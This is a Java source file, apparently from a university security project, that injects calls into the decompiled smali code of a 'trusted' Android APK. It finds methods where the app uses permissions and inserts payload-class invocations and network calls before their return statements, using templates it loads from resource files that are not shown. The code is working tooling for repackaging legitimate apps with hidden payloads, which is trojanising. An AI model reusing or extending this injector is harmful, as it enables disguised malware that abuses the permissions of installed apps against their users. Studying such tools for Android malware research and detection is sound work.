package it.unisannio.srss.dame.injection;

import it.unisannio.srss.dame.model.UsagePoint;
import it.unisannio.srss.utils.FileUtils;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.Map;
import java.util.Scanner;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 
 * @author Danilo Cianciulli
 *
 */
public class CallInjector {

	private final static String SMALI_NETWORK_CALL_FILE = "network_call.smali";
	private final static String SMALI_PAYLOAD_CALL_FILE = "payload_call.smali";

	private final static String INTERNET_PERMISSION = "INTERNET";

	private final static Logger log = LoggerFactory
			.getLogger(CallInjector.class);

	private final Map<String, Set<UsagePoint>> apkPermissions;

	private final Map<String, Set<String>> payloadPermissions;

	private final String basePath;

	private final String smaliNetworkCall, smaliPayloadCall;

	public Map<String, Set<UsagePoint>> getApkPermissions() {
		return apkPermissions;
	}

	public Map<String, Set<String>> getPayloadPermissions() {
		return payloadPermissions;
	}

	public String getBasePath() {
		return basePath;
	}

	/**
	 * 
	 * @param apkPermissions
	 *            Mappa che ha come chiave i permessi e come valori i punti di
	 *            utilizzo di questi nell'apk trusted
	 * @param payloadPermissions
	 *            Mappa che ha come chiave i permessi e come valori i payload
	 *            che li utilizzano
	 * @param basePath
	 * @throws FileNotFoundException
	 */
	public CallInjector(Map<String, Set<UsagePoint>> apkPermissions,
			Map<String, Set<String>> payloadPermissions, String basePath)
			throws FileNotFoundException {
		this.apkPermissions = apkPermissions;
		this.payloadPermissions = payloadPermissions;
		this.basePath = basePath.endsWith(File.separator) ? basePath.substring(
				0, basePath.length() - 1) : basePath;
		this.smaliNetworkCall = importResource(SMALI_NETWORK_CALL_FILE);
		this.smaliPayloadCall = importResource(SMALI_PAYLOAD_CALL_FILE);
	}

	public void inject() throws FileNotFoundException {
		FileUtils.checkDir(basePath);
		log.info("Injecting payload's calls");
		Set<String> permissions = payloadPermissions.keySet();
		for (String permission : permissions) {
			injectCalls(permission);
		}
		log.info("Injecting nerwork calls");
		injectCalls(INTERNET_PERMISSION, false);
		log.info("Injection successfull");
	}

	private File fromClassToFile(String canonicalName)
			throws FileNotFoundException {
		int len = canonicalName.indexOf(";");
		if (len == -1)
			len = canonicalName.length();
		String adjustedCanonicalName = canonicalName.substring(1, len);
		String path = basePath + File.separator + "smali" + File.separator
				+ adjustedCanonicalName + ".smali";
		log.debug("\"" + canonicalName + "\" --> \"" + path + "\"");
		File res = FileUtils.checkFile(path);
		return res;
	}

	private void injectCalls(String permission) {
		injectCalls(permission, true);
	}

	private void injectCalls(String permission, boolean payload) {
		Set<UsagePoint> usagePoint = apkPermissions.get(permission);
		if (usagePoint == null || usagePoint.size() == 0) {
			log.warn("The trusted APK does not use " + permission
					+ " permission.");
			return;
		}
		File file = null;
		for (UsagePoint up : usagePoint) {
			try {
				file = fromClassToFile(up.getClazz());
				StringBuffer sb = injectCallInMethod(file, up.getMethod(),
						payload ? payloadPermissions.get(permission) : null);
				writeFile(file, sb);
			} catch (IOException e) {
				log.warn("Skipping network call injection for class "
						+ up.getClazz());
			}
		}
	}

	private enum State {
		MATCH_METHOD, MATCH_LOCALS, MATCH_RETURN, INJECTION_DONE;
	}

	private StringBuffer injectCallInMethod(File file, String method,
			Set<String> payloads) throws FileNotFoundException {
		StringBuffer res = new StringBuffer();
		Scanner sc = new Scanner(file);
		String line = "";
		Matcher matcher = null;
		Pattern methodPattern = buildMethodPattern(method);
		Pattern returnPattern = buildReturnPattern();
		Pattern localsPattern = buildLocalsPattern();
		State state = State.MATCH_METHOD;
		int locals = 0;
		while (sc.hasNextLine()) {
			line = sc.nextLine();
			switch (state) {
			case MATCH_METHOD:
				matcher = methodPattern.matcher(line);
				if (matcher.matches() && !line.contains(" static ")) {
					log.debug("Method matched in class "
							+ file.getAbsolutePath() + ": " + line);
					state = State.MATCH_LOCALS;
				} else if (matcher.matches())
					log.debug("Skipping method " + method + " in class "
							+ file.getAbsolutePath()
							+ " because it is static. Looking for another one.");
				break;
			case MATCH_LOCALS:
				matcher = localsPattern.matcher(line);
				if (matcher.matches()) {
					locals = Integer.parseInt(matcher.group(1));
					if (locals < 16 && payloads != null && payloads.size() > 0) {
						locals++;
						log.debug("Setting \".locals " + locals + "\" (it was "
								+ (locals - 1) + ") for method " + method
								+ " in class " + file.getAbsolutePath());
						line = "    .locals " + locals;
					} else if (locals >= 16) {
						log.debug("Skipping locals modification because it is >= 16");
					}
					state = State.MATCH_RETURN;
				}
				break;
			case MATCH_RETURN:
				matcher = returnPattern.matcher(line);
				if (matcher.matches()) {
					if (locals <= 16) {
						if (payloads == null) {
							log.debug("Injecting network call in method "
									+ method + " of class "
									+ file.getAbsolutePath());
							res.append(smaliNetworkCall + "\n");
						} else {
							if (payloads.size() == 0)
								log.debug("No payloads to inject in method "
										+ method + " of class "
										+ file.getAbsolutePath());
							for (String payload : payloads) {
								log.debug("Injecting payload call " + payload
										+ " in method " + method + " of class "
										+ file.getAbsolutePath());
								res.append(smaliPayloadCall.replaceAll(
										"\\$\\{var_id\\}", (locals - 1) + "")
										.replaceAll("\\$\\{payload_class\\}",
												payload)
										+ "\n");
							}
						}
						state = State.INJECTION_DONE;
					} else {
						log.debug("Skipping injection in method "
								+ method
								+ " of class "
								+ file.getAbsolutePath()
								+ " because of too many locals. Looking for another one.");
						state = State.MATCH_METHOD;
					}
				}
				break;
			case INJECTION_DONE:
				break;
			}
			res.append(line);
			if (sc.hasNextLine())
				res.append("\n");
		}
		if (state == State.MATCH_METHOD)
			log.debug("No non-static methods " + method + " found in class "
					+ file.getAbsolutePath());
		else if (state != State.INJECTION_DONE)
			log.error("Invalid exit state (" + state + ") for method " + method
					+ " in class " + file.getAbsolutePath());
		sc.close();
		return res;

	}

	private static String importResource(String fileName)
			throws FileNotFoundException {
		log.debug("Importing file \"" + fileName + "\" from classpath;");
		InputStream in = ClassLoader.getSystemResourceAsStream(fileName);
		if (in == null) {
			String err = "Could not locate the file \"" + fileName
					+ "\" in the classpath";
			log.error(err);
			throw new FileNotFoundException(err);
		}
		String res = "";
		Scanner sc = new Scanner(in);
		while (sc.hasNextLine()) {
			res += sc.nextLine();
			if (sc.hasNextLine())
				res += "\n";
		}
		sc.close();
		return res;
	}

	private static Pattern buildMethodPattern(String method) {
		return Pattern.compile("^\\s*\\.method\\s.*" + method
				+ "\\s*\\(.*\\)\\s*(.+)\\s*$");
	}

	private static Pattern buildLocalsPattern() {
		return Pattern.compile("^\\s*\\.locals\\s+(\\d+)\\s*$");
	}

	private static Pattern buildReturnPattern() {
		return Pattern.compile("^\\s*return(\\-.*)?\\s*$");
	}

	private static void writeFile(File file, StringBuffer text)
			throws IOException {
		FileUtils.checkFile(file);
		file.delete();
		BufferedWriter output = new BufferedWriter(new FileWriter(file));
		output.write(text.toString());
		output.close();
	}

}
